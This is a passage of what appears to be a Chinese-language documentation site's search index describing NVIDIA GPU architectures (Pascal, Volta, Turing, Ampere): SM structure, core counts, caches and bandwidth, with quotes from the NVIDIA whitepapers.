\u200b\u6253\u5305\u200b\u8d77\u6765\u200b\u7528\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b\u8fdb\u884c\u200b\u8ba1\u7b97\u200b</li> </ul> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0cGP100 \u200b\u6bcf\u4e2a\u200b SM \u200b\u53ea\u6709\u200b 64 \u200b\u4e2a\u200b\u5355\u7cbe\u5ea6\u200b CUDA core\uff0c\u200b\u800c\u200b Maxwell \u200b\u6709\u200b 128 \u200b\u4e2a\u200b\uff0cKepler \u200b\u6709\u200b 192 \u200b\u4e2a\u200b\uff0cFermi \u200b\u6709\u200b 32 \u200b\u4e2a\u200b\uff0cTesla \u200b\u6709\u200b 8 \u200b\u4e2a\u200b\u3002GP100 \u200b\u7684\u200b\u4e00\u4e2a\u200b SM \u200b\u91cc\u200b\u6709\u200b\u4e24\u4e2a\u200b Processing Block\uff0c\u200b\u6bcf\u4e2a\u200b Processing Block \u200b\u6709\u200b\u4e00\u4e2a\u200b Instruction Buffer\u3001\u200b\u4e00\u4e2a\u53cc\u200b\u53d1\u5c04\u200b Warp Scheduler\u300132 \u200b\u4e2a\u200b\u5355\u7cbe\u5ea6\u200b CUDA core\u300116 \u200b\u4e2a\u200b\u53cc\u200b\u7cbe\u5ea6\u200b CUDA core\u30018 \u200b\u4e2a\u200b LD/ST Unit \u200b\u548c\u200b 8 \u200b\u4e2a\u200b SFU\uff0c\u200b\u548c\u200b Maxwell \u200b\u57fa\u672c\u200b\u4e00\u6837\u200b\u3002\u200b\u53ea\u4e0d\u8fc7\u200b Pascal \u200b\u67b6\u6784\u200b\u6bcf\u4e2a\u200b SM \u200b\u53ea\u6709\u200b\u4e24\u4e2a\u200b Processing Block\uff0c\u200b\u800c\u200b Maxwell \u200b\u6bcf\u4e2a\u200b SM \u200b\u6709\u200b\u56db\u4e2a\u200b Processing Block\u3002\u200b\u4f46\u200b Pascal \u200b\u67b6\u6784\u200b\u6bcf\u4e2a\u200b SM \u200b\u6709\u200b 64 KB \u200b\u7684\u200b Shared memory\uff0c\u200b\u5e76\u4e14\u200b SM \u200b\u7684\u200b\u6570\u91cf\u200b\u6bd4\u200b Maxwell \u200b\u7684\u200b\u4e24\u500d\u200b\u8fd8\u8981\u200b\u591a\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5b9e\u9645\u4e0a\u200b\u662f\u200b\u5728\u200b\u53d8\u76f8\u200b\u5730\u200b\u589e\u52a0\u200b Shared memory \u200b\u7684\u200b\u6570\u91cf\u200b\u3001\u200b\u5bb9\u91cf\u200b\u4ee5\u53ca\u200b\u5e26\u5bbd\u200b\u3002</p> <p> </p> Pascal \u200b\u67b6\u6784\u200b SM\uff08\u200b\u6765\u6e90\u200b\uff1aNVIDIA Tesla P100 Whitepaper\uff09 <p>\u200b\u6839\u636e\u200b https://arxiv.org/pdf/1804.06826.pdf\uff0cPascal \u200b\u67b6\u6784\u200b\u6bcf\u4e2a\u200b\u5468\u671f\u200b\u6bcf\u4e2a\u200b SM \u200b\u53ef\u4ee5\u200b\u8bfb\u53d6\u200b 128 \u200b\u5b57\u8282\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u4e5f\u5c31\u662f\u8bf4\u200b\uff0c\u200b\u6bcf\u4e2a\u200b LD/ST unit \u200b\u6bcf\u200b\u5468\u671f\u200b\u53ef\u4ee5\u200b\u8bfb\u53d6\u200b \\(128 / 2 / 8 = 8\\) \u200b\u5b57\u8282\u200b\u7684\u200b\u6570\u636e\u200b\u3002</p>"},{"location":"hardware/gpgpu.html#nvidia-volta","title":"NVIDIA Volta","text":"<p>Whitepaper: NVIDIA TESLA V100 GPU ARCHITECTURE</p> <p>Tuning Guide: Tuning CUDA Applications for Volta</p> <p>PPT: VOLTA: PROGRAMMABILITY AND PERFORMANCE</p> <p>GV100 \u200b\u662f\u200b Volta \u200b\u67b6\u6784\u200b\u7684\u200b GPU\uff0c\u200b\u5b83\u200b\u7684\u200b\u6539\u8fdb\u200b\u5305\u62ec\u200b\uff1a</p> <ul> <li>TSMC 12nm FFN \u200b\u5de5\u827a\u200b\uff0c815 mm^2 \u200b\u9762\u79ef\u200b\uff0c21.1 billion transistors</li> <li>\u200b\u628a\u200b Tensor Core \u200b\u5f15\u5165\u200b\u5230\u200b SM \u200b\u4e2d\u200b</li> <li>\u200b\u652f\u6301\u200b Independent Thread Scheduling\uff0c\u200b\u6539\u53d8\u200b\u4e86\u200b Warp \u200b\u7684\u200b\u5206\u53c9\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u539f\u6765\u200b Warp \u200b\u5206\u53c9\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u53ea\u80fd\u200b\u5148\u8d70\u200b\u4e00\u4e2a\u200b\u5206\u652f\u200b\uff0c\u200b\u518d\u200b\u8d70\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u5206\u652f\u200b\uff1b\u200b\u4ece\u200b Volta \u200b\u5f00\u59cb\u200b\uff0cWarp \u200b\u5206\u53c9\u200b\u4ee5\u540e\u200b\u4f1a\u200b\u53d8\u6210\u200b\u4e24\u4e2a\u200b Warp\uff0c\u200b\u56e0\u6b64\u200b\u5206\u652f\u200b\u7684\u200b\u4e24\u4e2a\u200b\u65b9\u5411\u200b\u53ef\u4ee5\u200b Interleaved \u200b\u65b9\u5f0f\u200b\u6267\u884c\u200b</li> <li>6 \u200b\u4e2a\u200b GPC\uff0c\u200b\u6bcf\u4e2a\u200b GPC \u200b\u6709\u200b 7 \u200b\u4e2a\u200b TPC\uff0c\u200b\u6bcf\u4e2a\u200b TPC \u200b\u6709\u200b 2 \u200b\u4e2a\u200b SM\uff1b\u200b\u4e00\u5171\u200b\u6709\u200b 84 \u200b\u4e2a\u200b SM\uff08<code>Six GPCs, Each GPC has: Seven TPCs (each including two SMs), 14 SMs</code>\uff09</li> <li>\u200b\u6bcf\u4e2a\u200b SM \u200b\u6709\u200b 64 \u200b\u4e2a\u200b FP32 CUDA core\uff0c64 \u200b\u4e2a\u200b INT32 CUDA core\uff0c32 \u200b\u4e2a\u200b FP64 CUDA core\uff0c8 \u200b\u4e2a\u200b Tensor Core \u200b\u548c\u200b 4 \u200b\u4e2a\u200b Texture Unit\uff08<code>Each SM has: 64 FP32 cores, 64 INT32 cores, 32 FP64 cores, 8 Tensor Cores, Four texture units</code>\uff09</li> <li>8 \u200b\u4e2a\u200b 512-bit Memory Controller\uff08<code>Eight 512-bit memory controllers (4096 bits total)</code>\uff09</li> </ul> <p>GV100 \u200b\u53c8\u200b\u56de\u5230\u200b\u4e86\u200b\u6bcf\u4e2a\u200b SM \u200b\u62c6\u200b\u5206\u6210\u200b 4 \u200b\u4e2a\u200b Processing Block\uff0c\u200b\u6bcf\u4e2a\u200b Processing Block \u200b\u5305\u62ec\u200b\uff08<code>The GV100 SM is partitioned into four processing blocks, each with 16 FP32 Cores, 8 FP64 Cores, 16 INT32 Cores, two of the new mixed-precision Tensor Cores for deep learning matrix arithmetic, a new L0 instruction cache, one warp scheduler, one dispatch unit, and a 64 KB Register File. Note that the new L0 instruction cache is now used in each partition to provide higher efficiency than the instruction buffers used in prior NVIDIA GPUs. (See the Volta SM in Figure 5).</code>\uff09\uff1a</p> <ul> <li>L0 Instruction Cache</li> <li>\u200b\u4e00\u4e2a\u200b\u5355\u200b\u53d1\u5c04\u200b Warp Scheduler</li> <li>Register File</li> <li>16 \u200b\u4e2a\u200b FP32 core\uff0c16 \u200b\u4e2a\u200b INT32 core\uff0c8 \u200b\u4e2a\u200b FP64 core\uff0c8 \u200b\u4e2a\u200b LD/ST unit\uff0c2 \u200b\u4e2a\u200b Tensor Core\uff0c4 \u200b\u4e2a\u200b SFU</li> </ul> <p> </p> Volta \u200b\u67b6\u6784\u200b SM\uff08\u200b\u6765\u6e90\u200b\uff1aNVIDIA TESLA V100 GPU ARCHITECTURE Figure 5\uff09 <p>\u200b\u6ce8\u610f\u200b Volta \u200b\u7684\u200b Warp Scheduler \u200b\u53c8\u200b\u56de\u5230\u200b\u4e86\u200b\u5355\u200b\u53d1\u5c04\u200b\uff0c\u200b\u8fd9\u200b\u662f\u56e0\u4e3a\u200b\u6bcf\u4e2a\u200b Processing Block \u200b\u7684\u200b FP32 core \u200b\u53d8\u5c11\u200b\u4e86\u200b\uff08GP100 \u200b\u662f\u200b 32 \u200b\u4e2a\u200b\uff0cGV100 \u200b\u662f\u200b 16 \u200b\u4e2a\u200b\uff09\uff0c\u200b\u4f8b\u5982\u200b\u4e00\u6761\u200b\u6d89\u53ca\u200b 32 \u200b\u6761\u200b\u7ebf\u7a0b\u200b\u7684\u200b\u6307\u4ee4\u200b\u88ab\u200b\u53d1\u5c04\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5b83\u200b\u9700\u8981\u200b\u4e24\u4e2a\u200b\u5468\u671f\u200b\u6765\u200b\u5b8c\u6210\u200b\uff0c\u200b\u7b2c\u4e8c\u4e2a\u200b\u5468\u671f\u200b\u7684\u200b\u65f6\u5019\u200b\uff0cWarp Scheduler \u200b\u4e5f\u200b\u4f1a\u200b\u540c\u65f6\u200b\u53d1\u5c04\u200b\u5176\u4ed6\u200b\u6307\u4ee4\u200b\uff0c\u200b\u4ece\u800c\u200b\u5b9e\u73b0\u200b\u6307\u4ee4\u200b\u7ea7\u200b\u5e76\u884c\u200b\u3002</p> <p>\u200b\u6839\u636e\u200b Understanding instruction dispatching in Volta architecture\uff0c\u200b\u5b9e\u9645\u4e0a\u200b LD/ST unit \u200b\u5e76\u200b\u4e0d\u662f\u200b\u5206\u5e03\u200b\u5728\u200b\u56db\u4e2a\u200b Processing Block \u200b\u5185\u200b\uff0c\u200b\u800c\u662f\u200b\u5728\u200b SM \u200b\u7ea7\u522b\u200b\u5171\u4eab\u200b\uff0c\u200b\u4e5f\u5c31\u662f\u8bf4\u200b SM \u200b\u6709\u200b\u516c\u5171\u200b\u7684\u200b 32 \u200b\u4e2a\u200b LD/ST unit\uff0c\u200b\u8fd9\u200b 32 \u200b\u4e2a\u200b\u516c\u5171\u200b\u7684\u200b LD/ST unit \u200b\u4f9b\u200b\u56db\u4e2a\u200b Processing Block \u200b\u5171\u4eab\u200b\u3002</p> <p>\u200b\u5728\u200b Volta \u200b\u67b6\u6784\u200b\u4e2d\u200b\uff0cL1 Data Cache \u200b\u548c\u200b Shared memory \u200b\u518d\u6b21\u200b\u5171\u4eab\u200b\u3002\u200b\u540c\u65f6\u200b\u5f15\u5165\u200b\u4e86\u200b L0 Instruction Cache\uff0c\u200b\u6bcf\u4e2a\u200b Processing Block \u200b\u5185\u90e8\u200b\u90fd\u200b\u6709\u200b\u4e00\u4e2a\u200b\u3002\u200b\u6b64\u5916\u200b\uff0cFP32 \u200b\u5355\u5143\u200b\u4ece\u200b INT32 \u200b\u5355\u5143\u200b\u72ec\u7acb\u200b\u51fa\u6765\u200b\uff0c\u200b\u4f7f\u5f97\u200b\u5b83\u4eec\u200b\u53ef\u4ee5\u200b\u540c\u65f6\u200b\u8fdb\u884c\u200b\u8ba1\u7b97\u200b\uff08<code>the Volta GV100 SM includes separate FP32 and INT32 cores, allowing simultaneous execution of FP32 and INT32 operations at full throughput</code>\uff09\u3002\u200b\u6839\u636e\u200b https://arxiv.org/pdf/1804.06826.pdf\uff0cVolta \u200b\u67b6\u6784\u200b\u6bcf\u4e2a\u200b\u5468\u671f\u200b\u6bcf\u4e2a\u200b SM \u200b\u53ef\u4ee5\u200b\u8bfb\u53d6\u200b 256 \u200b\u5b57\u8282\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u4e5f\u5c31\u662f\u8bf4\u200b\uff0c\u200b\u6bcf\u4e2a\u200b LD/ST unit \u200b\u6bcf\u200b\u5468\u671f\u200b\u53ef\u4ee5\u200b\u8bfb\u53d6\u200b \\(256 / 4 / 8 = 8\\) \u200b\u5b57\u8282\u200b\u7684\u200b\u6570\u636e\u200b\u3002\u200b\u4f46\u200b\u6839\u636e\u200b https://github.com/te42kyfo/gpu-benches \u200b\u5b9e\u6d4b\u200b\uff0c\u200b\u6bcf\u4e2a\u200b SM \u200b\u6bcf\u200b\u5468\u671f\u200b\u53ea\u80fd\u200b\u8bfb\u53d6\u200b\u4e0d\u5230\u200b 128 \u200b\u5b57\u8282\u200b\uff0814 TB/s\uff0c80 \u200b\u4e2a\u200b SM\uff0c\u200b\u65f6\u949f\u200b\u9891\u7387\u200b 1530 MHz\uff0c\u200b\u6bcf\u4e2a\u200b SM \u200b\u6bcf\u200b\u5468\u671f\u200b\u8bfb\u53d6\u200b \\(14 / 80 / 1530 * 1e6 = 114\\) \u200b\u5b57\u8282\u200b\uff09\u200b\u7684\u200b\u6570\u636e\u200b\u3002</p> <p>GV100 \u200b\u6709\u200b 6144 KB \u200b\u7684\u200b L2 \u200b\u7f13\u5b58\u200b\uff08<code>The full GV100 GPU includes a total of 6144 KB of L2 cache.</code>\uff09\uff0c\u200b\u5206\u4e3a\u200b 64 \u200b\u4e2a\u200b L2 slice\uff0c\u200b\u6bcf\u4e2a\u200b slice \u200b\u662f\u200b 96 KB \u200b\u7684\u200b\u5927\u5c0f\u200b\u3002\u200b\u6bcf\u4e2a\u200b slice \u200b\u6bcf\u200b\u5468\u671f\u200b\u53ef\u4ee5\u200b\u8bfb\u53d6\u200b 32 B \u200b\u7684\u200b\u6570\u636e\u200b\uff08<code>32 B/clk/slice</code>\uff09\uff0c\u200b\u56e0\u6b64\u200b\u6574\u4e2a\u200b L2 \u200b\u7f13\u5b58\u200b\u7684\u200b\u8bfb\u200b\u5e26\u5bbd\u200b\u662f\u200b \\(64 * 32 = 2048\\) \u200b\u5b57\u8282\u200b\u6bcf\u200b\u5468\u671f\u200b\uff08<code>compared to V100 L2 cache read bandwidth of 2048 Bytes/clk.</code>\uff09\u3002L2 \u200b\u7f13\u5b58\u200b\u5de5\u4f5c\u200b\u5728\u200b\u548c\u200b SM \u200b\u540c\u4e00\u4e2a\u200b\u9891\u7387\u200b\u4e0b\u200b\uff0c\u200b\u6309\u200b 1530 MHz \u200b\u9891\u7387\u200b\u6765\u7b97\u200b\uff0cL2 \u200b\u7f13\u5b58\u200b\u5e26\u5bbd\u200b\u662f\u200b \\(2048 * 1530 = 3.133\\) TB/s\uff0cV100 \u200b\u7684\u200b\u5185\u5b58\u200b\u5e26\u5bbd\u200b\u662f\u200b 0.9 TB/s\uff0c\u200b\u6bcf\u4e2a\u200b SM \u200b\u6bcf\u4e2a\u200b\u5468\u671f\u200b\u53ef\u4ee5\u200b\u5206\u5230\u200b\u7684\u200b L2 \u200b\u5e26\u5bbd\u200b\u662f\u200b \\(2048 / 80 = 25.6\\) \u200b\u5b57\u8282\u200b\uff08<code>V100 has a peak math rate of 125 FP16 Tensor TFLOPS, an off-chip memory bandwidth of approx. 900 GB/s, and an on-chip L2 bandwidth of 3.1 TB/s, giving it a ops:byte ratio between 40 and 139, depending on the source of an operation\u2019s data (on-chip or off-chip memory).</code>\uff09\u3002</p>"},{"location":"hardware/gpgpu.html#nvidia-turing","title":"NVIDIA Turing","text":"<p>Whitepaper: NVIDIA TURING GPU ARCHITECTURE</p> <p>PPT: RTX ON \u2013 THE NVIDIA TURING GPU</p> <p>TU102 \u200b\u662f\u200b Turing \u200b\u67b6\u6784\u200b\u7684\u200b\u4e00\u6b3e\u200b GPGPU \u200b\u82af\u7247\u200b\uff0c\u200b\u5b83\u200b\u5305\u62ec\u200b\u4e86\u200b\uff1a</p> <ul> <li>6 GPC\uff0c\u200b\u6bcf\u4e2a\u200b GPC \u200b\u6709\u200b 6 \u200b\u4e2a\u200b TPC\uff0c\u200b\u6bcf\u4e2a\u200b TPC \u200b\u6709\u200b 2 \u200b\u4e2a\u200b SM\uff1b\u200b\u4e00\u5171\u200b\u662f\u200b 72 \u200b\u4e2a\u200b SM\uff08<code>The TU102 GPU includes six Graphics Processing Clusters (GPCs), 36 Texture Processing Clusters (TPCs), and 72 Streaming Multiprocessors (SMs).</code>\uff09</li> <li>\u200b\u6bcf\u4e2a\u200b GPC \u200b\u6709\u200b\u4e00\u4e2a\u200b raster engine\uff08<code>Each GPC includes a dedicated raster engine</code>\uff09</li> <li>\u200b\u6bcf\u4e2a\u200b SM \u200b\u6709\u200b 64 \u200b\u4e2a\u200b CUDA core\uff0c8 \u200b\u4e2a\u200b tensor core\uff0c4 \u200b\u4e2a\u200b texture unit\uff0c256 KB \u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\u548c\u200b 96KB \u200b\u7684\u200b L1/Shared Memory\uff08<code>Each SM contains 64 CUDA Cores, eight Tensor Cores, a 256 KB register file, four texture units, and 96 KB of L1/shared memory</code>\uff09</li> <li>12 \u200b\u4e2a\u200b 32-bit GDDR6 memory controller\uff08<code>12 32-bit GDDR6 memory controllers (384-bits total)</code>\uff09</li> </ul> <p>Turing \u200b\u67b6\u6784\u200b\u7684\u200b SM \u200b\u5206\u6210\u200b\u56db\u4e2a\u200b Processing Block\uff0c\u200b\u6bcf\u4e2a\u200b Processing Block \u200b\u5305\u62ec\u200b\uff08<code>The Turing SM is partitioned into four processing blocks, each with 16 FP32 Cores, 16 INT32 Cores, two Tensor Cores, one warp scheduler, and one dispatch unit. Each block includes a new L0 instruction cache and a 64 KB register file. The four processing blocks share a combined 96 KB L1 data cache/shared memory.</code>\uff09\uff1a</p> <ul> <li>16 \u200b\u4e2a\u200b FP32 core\uff0c16 \u200b\u4e2a\u200b INT32 core\uff0c2 \u200b\u4e2a\u200b Tensor Core</li> <li>\u200b\u4e00\u4e2a\u200b\u5355\u200b\u53d1\u5c04\u200b Warp Scheduler</li> <li>L0 \u200b\u6307\u4ee4\u200b\u7f13\u5b58\u200b</li> <li>64KB \u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b</li> </ul> <p> </p> Turing \u200b\u67b6\u6784\u200b SM\uff08\u200b\u6765\u6e90\u200b\uff1aNVIDIA TURING GPU ARCHITECTURE Figure 4\uff09 <p>TU102 GPU \u200b\u6bcf\u4e2a\u200b SM \u200b\u8fd8\u6709\u200b\u4e24\u4e2a\u200b FP64 \u200b\u5355\u5143\u200b\uff0c\u200b\u56e0\u6b64\u200b TU102 \u200b\u7684\u200b\u53cc\u200b\u7cbe\u5ea6\u200b\u6027\u80fd\u200b\u53ea\u6709\u200b\u5355\u7cbe\u5ea6\u200b\u6027\u80fd\u200b\u7684\u200b 1/32\u3002\uff08<code>The TU102 GPU also features 144 FP64 units (two per SM), which are not depicted in this diagram. The FP64 TFLOP rate is 1/32nd the TFLOP rate of FP32 operations. The small number of FP64 hardware units are included to ensure any programs with FP64 code operates correctly.</code>\uff09</p> <p>\u200b\u4e0b\u9762\u200b\u662f\u200b Turing \u200b\u67b6\u6784\u200b\u7684\u200b SM \u200b\u7684\u200b\u5fae\u200b\u67b6\u6784\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u5b83\u200b\u7684\u200b\u8bbf\u5b58\u200b\u90e8\u5206\u200b\uff08Memory I/O\uff0cMIO\uff09\u200b\u662f\u200b\u7531\u200b\u653e\u5728\u200b Processing Block \u200b\u5916\u9762\u200b\u3001SM \u200b\u91cc\u9762\u200b\u7684\u200b MIO \u200b\u5355\u5143\u200b\u5b8c\u6210\u200b\uff1a</p> <p> </p> Turing \u200b\u67b6\u6784\u200b SM \u200b\u5fae\u200b\u67b6\u6784\u200b\uff08\u200b\u6765\u6e90\u200b\uff1aRTX ON \u2013 THE NVIDIA TURING GPU\uff09 <p> </p> Turing \u200b\u67b6\u6784\u200b MIO \u200b\u5fae\u200b\u67b6\u6784\u200b\uff08\u200b\u6765\u6e90\u200b\uff1aRTX ON \u2013 THE NVIDIA TURING GPU\uff09 <p>Turing \u200b\u67b6\u6784\u200b\u7684\u200b\u6bcf\u200b TPC \u200b\u7684\u200b L1 \u200b\u5e26\u5bbd\u200b\u662f\u200b Pascal \u200b\u67b6\u6784\u200b\u7684\u200b\u4e24\u500d\u200b\u3002\uff08<code>increasing its hit bandwidth by 2x per TPC compared to Pascal</code>\uff09</p>"},{"location":"hardware/gpgpu.html#nvidia-ampere","title":"NVIDIA Ampere","text":"<p>Whitepaper: NVIDIA A100 Tensor Core GPU Architecture</p> <p>PPT: NVIDIA A100 GPU: PERFORMANCE &amp; INNOVATION FOR GPU COMPUTING</p> <p>\u200b\u8bba\u6587\u200b\uff1aThe A100 Datacenter GPU and Ampere Architecture</p> <p>\u200b\u8bba\u6587\u200b\uff1aDemystifying the Nvidia Ampere Architecture through Microbenchmarking and Instruction-level Analysis</p>"},{"location":"hardware/gpgpu.html#ga100","title":"GA100","text":"<p>\u200b\u5b8c\u6574\u200b\u7684\u200b GA100 \u200b\u82af\u7247\u200b\u5305\u62ec\u200b\uff1a</p> <ul> <li>8 \u200b\u4e2a\u200b GPC\uff0c\u200b\u6bcf\u4e2a\u200b GPC \u200b\u6709\u200b 8 \u200b\u4e2a\u200b TPC\uff0c\u200b\u6bcf\u4e2a\u200b TPC \u200b\u6709\u200b 2 \u200b\u4e2a\u200b SM\uff1a\u200b\u4e00\u5171\u200b 128 \u200b\u4e2a\u200b SM\uff08<code>8 GPCs, 8 TPCs/GPC, 2 SMs/TPC, 16 SMs/GPC, 128 SMs per full GPU</code>\uff09</li> <li>\u200b\u6bcf\u4e2a\u200b SM \u200b\u6709\u200b 4 \u200b\u4e2a\u200b Processing Block\uff0c\u200b\u6bcf\u4e2a\u200b PB \u200b\u6709\u200b\uff1a16 \u200b\u4e2a\u200b INT32 core\uff0c16 \u200b\u4e2a\u200b FP32 core\uff0c8 \u200b\u4e2a\u200b FP64 core\uff0c1 \u200b\u4e2a\u200b\u7b2c\u4e09\u4ee3\u200b Tensor Core\uff0c8 \u200b\u4e2a\u200b LD/ST unit \u200b\u548c\u200b 4 \u200b\u4e2a\u200b SFU</li> <li>6 \u200b\u4e2a\u200b HBM2 stack\uff0c\u200b\u5bf9\u5e94\u200b 12 \u200b\u4e2a\u200b 512-bit memory controller\uff08<code>6 HBM2 stacks, 12 512-bit Memory Controllers</code>\uff09</li> </ul> <p>\u200b\u6bcf\u4e2a\u200b SM \u200b\u7684\u200b L1 Data Cache/Shared Memory \u200b\u603b\u91cf\u200b\u589e\u52a0\u200b\u5230\u200b\u4e86\u200b 192 KB\u3002\uff08<code>192 KB of combined shared memory and L1 data cache, 1.5x larger than V100 SM</code>\uff09</p> <p> </p> Ampere \u200b\u67b6\u6784\u200b GA100 SM\uff08\u200b\u6765\u6e90\u200b\uff1aNVIDIA A100 Tensor Core GPU Architecture Figure 7\uff09 <p>A100 GPU \u200b\u6709\u200b 40 MB \u200b\u7684\u200b L2 \u200b\u7f13\u5b58\u200b\uff08<code>The A100 GPU in the A100 Tensor Core GPU includes 40 MB of L2 cache, which is 6.7x larger than Tesla V100 L2 cache.</code>\uff09\uff0c\u200b\u5206\u4e3a\u200b\u4e24\u4e2a\u200b partition\uff0c\u200b\u6bcf\u4e2a\u200b partition \u200b\u6709\u200b 40 \u200b\u4e2a\u200b L2 slice\uff0c\u200b\u6bcf\u4e2a\u200b slice \u200b\u662f\u200b 512 KB \u200b\u7684\u200b\u5927\u5c0f\u200b\uff0c\u200b\u6bcf\u200b 8 \u200b\u4e2a\u200b L2 slice \u200b\u5bf9\u5e94\u200b\u4e00\u4e2a\u200b memory controller\uff08<code>Each L2 cache partition is divided into 40 L2 cache slices. Eight 512 KB L2 slices are associated with each memory controller.</code>\uff09\u3002\u200b\u6bcf\u4e2a\u200b slice \u200b\u6bcf\u200b\u5468\u671f\u200b\u53ef\u4ee5\u200b\u8bfb\u53d6\u200b 64B \u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u56e0\u6b64\u200b\u6574\u4e2a\u200b L2 \u200b\u7f13\u5b58\u200b\u7684\u200b\u8bfb\u200b\u5e26\u5bbd\u200b\u662f\u200b \\(2 * 40 * 64 = 5120\\) \u200b\u5b57\u8282\u200b\u6bcf\u200b\u5468\u671f\u200b\uff08<code>The A100 L2 read bandwidth is 5120 Bytes/clk</code>\uff09\u3002L2 \u200b\u7f13\u5b58\u200b\u5de5\u4f5c\u200b\u5728\u200b\u548c\u200b SM \u200b\u540c\u4e00\u4e2a\u200b\u9891\u7387\u200b\u4e0b\u200b\uff0c\u200b\u6309\u200b 1410 MHz \u200b\u9891\u7387\u200b\u6765\u7b97\u200b\uff0cL2 \u200b\u7f13\u5b58\u200b\u5e26\u5bbd\u200b\u662f\u200b \\(5120 * 1410 = 7.219\\) TB/s\uff0cA100 \u200b\u7684\u200b\u5185\u5b58\u200b\u5e26\u5bbd\u200b\u662f\u200b 1.555 TB/s\uff0c\u200b\u6bcf\u4e2a\u200b SM \u200b\u6bcf\u4e2a\u200b\u5468\u671f\u200b\u53ef\u4ee5\u200b\u5206\u5230\u200b\u7684\u200b L2 \u200b\u5e26\u5bbd\u200b\u662f\u200b \\(5120 / 108 = 47.4\\) \u200b\u5b57\u8282\u200b\u3002</p> <p>\u200b\u6839\u636e\u200b https://github.com/te42kyfo/gpu-benches \u200b\u5b9e\u6d4b\u200b\uff0c\u200b\u6bcf\u4e2a\u200b SM \u200b\u6bcf\u200b\u5468\u671f\u200b\u53ea\u80fd\u200b\u8bfb\u53d6\u200b\u4e0d\u5230\u200b 128 \u200b\u5b57\u8282\u200b\uff0819 TB/s\uff0c108 \u200b\u4e2a\u200b SM\uff0c\u200b\u65f6\u949f\u200b\u9891\u7387\u200b 1410 MHz\uff0c\u200b\u6bcf\u4e2a\u200b SM \u200b\u6bcf\u200b\u5468\u671f\u200b\u8bfb\u53d6\u200b \\(19 / 108 / 1410 * 1e6 = 125\\) \u200b\u5b57\u8282\u200b\uff09\u200b\u7684\u200b\u6570\u636e\u200b\u3002</p> <p>A100 GPU \u200b\u6709\u200b 108 \u200b\u4e2a\u200b SM\uff0c\u200b\u4e00\u5171\u200b 432 \u200b\u4e2a\u200b Tensor Core\uff0c\u200b\u6bcf\u4e2a\u200b Tensor Core \u200b\u6bcf\u200b\u5468\u671f\u200b\u53ef\u4ee5\u200b\u8fdb\u884c\u200b 256 \u200b\u4e2a\u200b FP16 FMA \u200b\u8ba1\u7b97\u200b\uff0cSM \u200b\u9891\u7387\u200b 1410 MHz\uff0c\u200b\u56e0\u6b64\u200b A100 \u200b\u7684\u200b FP16 Tensor Core \u200b\u5cf0\u503c\u200b\u6027\u80fd\u200b\u662f\u200b <code>432 * 256 FLOPS * 2 * 1410 MHz = 312 TFLOPS</code>\u3002</p>"},{"location":"hardware/gpgpu.html#ga102","title":"GA102","text":"<p>Whitepaper: NVIDIA AMPERE GA102 GPU ARCHITECTURE</p> <p>GA102 \u200b\u7684\u200b SM \u200b\u5305\u62ec\u200b\u56db\u4e2a\u200b PB\uff0c\u200b\u6bcf\u4e2a\u200b PB \u200b\u5305\u62ec\u200b 16 \u200b\u4e2a\u200b FP32/INT32 core\uff0c16 \u200b\u4e2a\u200b FP32 core\uff0c\u200b\u4e00\u4e2a\u200b Tensor Core\uff0c4 \u200b\u4e2a\u200b LD/ST unit \u200b\u548c\u200b 4 \u200b\u4e2a\u200b SFU\u3002\u200b\u4e5f\u200b\u5c31\u200b\u662f\u4ece\u200b\u8fd9\u200b\u4e00\u4ee3\u200b\u5f00\u59cb\u200b\uff0c\u200b\u51fa\u73b0\u200b\u4e86\u200b FP32/INT32 \u200b\u6df7\u5408\u200b\u7684\u200b core\uff0c\u200b\u4f7f\u5f97\u200b FP32 \u200b\u5cf0\u503c\u200b\u6027\u80fd\u200b\u7ffb\u500d\u200b\uff0c\u200b\u4f46\u662f\u200b\u8fd9\u4e2a\u200b\u5cf0\u503c\u200b\u4e5f\u200b\u66f4\u200b\u96be\u200b\u8fbe\u5230\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u8fbe\u5230\u200b\u5cf0\u503c\u200b\u610f\u5473\u7740\u200b\u4e0d\u7528\u200b\u5230\u200b FP32/INT32 core \u200b\u7684\u200b INT32 \u200b\u90e8\u5206\u200b\u3002\uff08<code>GA10X includes FP32 processing on both datapaths, doubling the peak processing rate for FP32 operations. One datapath in each partition consists of 16 FP32 CUDA Cores capable of executing 16 FP32 operations per clock. Another datapath consists of both 16 FP32 CUDA Cores and 16 INT32 Cores, and is capable of executing either 16 FP32 operations OR 16 INT32 operations per clock. As a result of this new design, each GA10x SM partition is capable of executing either 32 FP32 operations per clock, or 16 FP32 and 16 INT32 operations per clock.</code>\uff09</p> <p> </p> Ampere \u200b\u67b6\u6784\u200b GA102 SM\uff08\u200b\u6765\u6e90\u200b\uff1aNVIDIA NVIDIA AMPERE GA102 GPU ARCHITECTURE Figure 3\uff09 <p>GA102 \u200b\u6709\u200b 12 \u200b\u4e2a\u200b 32 \u200b\u4f4d\u200b\u7684\u200b\u5185\u5b58\u200b\u63a7\u5236\u5668\u200b\uff0c\u200b\u4e00\u5171\u200b\u662f\u200b 384 \u200b\u4f4d\u200b\u5bbd\u5ea6\u200b\u3002GA102 12 \u200b\u7ec4\u200b 512KB \u200b\u7684\u200b L2 \u200b\u7f13\u5b58\u200b\uff0c\u200b\u6bcf\u7ec4\u200b\u5bf9\u5e94\u200b\u4e00\u4e2a\u200b\u5185\u5b58\u200b\u63a7\u5236\u5668\u200b\uff0cL2 \u200b\u4e00\u5171\u200b\u662f\u200b 6144 KB\u3002\uff08<code>The memory subsystem of GA102 consists of twelve 32-bit memory controllers (384-bit total). 512 KB of L2 cache is paired with each 32-bit memory controller, for a total of 6144 KB on the full GA102 GPU.</code>\uff09\u3002</p> <p>GA102 \u200b\u7684\u200b shared memory \u200b\u5e26\u5bbd\u200b\u662f\u200b\u6bcf\u4e2a\u200b SM 